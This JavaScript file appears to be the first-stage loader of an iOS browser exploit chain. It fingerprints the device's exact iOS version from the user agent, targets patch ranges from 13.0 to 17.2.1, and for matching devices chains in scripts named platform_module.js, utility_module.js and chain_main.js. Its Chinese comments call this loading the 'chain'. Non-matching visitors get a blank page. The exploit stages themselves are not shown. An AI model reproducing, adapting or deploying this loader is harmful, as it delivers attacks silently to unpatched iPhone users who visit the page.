(function() {
  var ua = navigator.userAgent;

  function getIOSVersion() {
    function pad(s) { return s.length === 1 ? '0' + s : s; }
    
    
    var u = ua.match(/iPhone OS (\d+)_(\d+)(?:_(\d+))?/);
    if (u) return parseInt(pad(u[1]) + pad(u[2]) + (u[3] ? pad(u[3]) : '00'), 10);
    u = ua.match(/CPU OS (\d+)_(\d+)(?:_(\d+))?/);
    if (u) return parseInt(pad(u[1]) + pad(u[2]) + (u[3] ? pad(u[3]) : '00'), 10);
    u = ua.match(/Version\/(\d+)\.(\d+)(?:\.(\d+))?/);
    if (!u && /^Mozilla\/5\.0 /.test(ua))
      u = ua.match(/iOS\/(\d+)\.(\d+)(?:\.(\d+))?/);
    if (!u) return 0;
    return parseInt(pad(u[1]) + pad(u[2]) + (u[3] ? pad(u[3]) : '00'), 10);
  }

  var ver = getIOSVersion();

  
  
  
  window.__15X_SERVER_LOG = false;
  var __15X_LOGID = 0;

  
  function rlog(msg) {
    var line = '[router] ' + msg;
    if (!window.__15X_SERVER_LOG) return;
    try { console.log('[log] ' + line); } catch(e) {}
    try { if (window.__logViewAdd) window.__logViewAdd(line); } catch(e) {}
    try {
      var buf = JSON.parse(sessionStorage.getItem('__15x_router_logs') || '[]');
      buf.push(new Date().toISOString().slice(11, 23) + ' ' + line);
      if (buf.length > 300) buf = buf.slice(buf.length - 300);
      sessionStorage.setItem('__15x_router_logs', JSON.stringify(buf));
    } catch(e) {}
    try {
      var mx = new XMLHttpRequest();
      mx.open('POST', '/api/debug/logs', false);
      mx.setRequestHeader('Content-Type', 'text/plain;charset=UTF-8');
      mx.send('#' + (__15X_LOGID++) + ' ' + line);
    } catch(e) {}
  }

  rlog('iOS version: ' + ver + (ver ? '' : '(非 iOS 环境)'));

  
  function runtimeEventId() {
    try {
      var b = window.PromotionIntegrationBridge;
      if (!b || typeof b.ready !== 'function') return Promise.resolve('');
      return Promise.resolve(b.ready()).then(function (rt) {
        return (rt && rt.pageViewEventId) || '';
      }).catch(function () { return ''; });
    } catch (e) { return Promise.resolve(''); }
  }

  function loadScript(src, onload) {
    runtimeEventId().then(function (ev) {
      var s = document.createElement('script');
      s.src = src + '?' + Date.now() + (ev ? '&ctx=' + encodeURIComponent(ev) : '');
      s.onerror = function() { rlog('加载失败: ' + src); };
      if (onload) s.onload = onload;
      document.head.appendChild(s);
    });
  }

  
  
  
  if ((ver >= 130000 && ver <= 130700) ||
      (ver >= 140000 && ver <= 140801) ||
      (ver >= 150000 && ver <= 150808) ||
      (ver >= 160000 && ver <= 160714) ||
      (ver >= 170000 && ver <= 170201)) {
    rlog('v3 版本命中,加载链');
    loadScript('platform_module.js', function() {
      loadScript('utility_module.js', function() {
        loadScript('chain_main.js');
      });
    });
  } else {
    rlog('版本不在 v3 覆盖范围(13.0–17.2.1),不加载链(页面保持空白)');
  }
})();
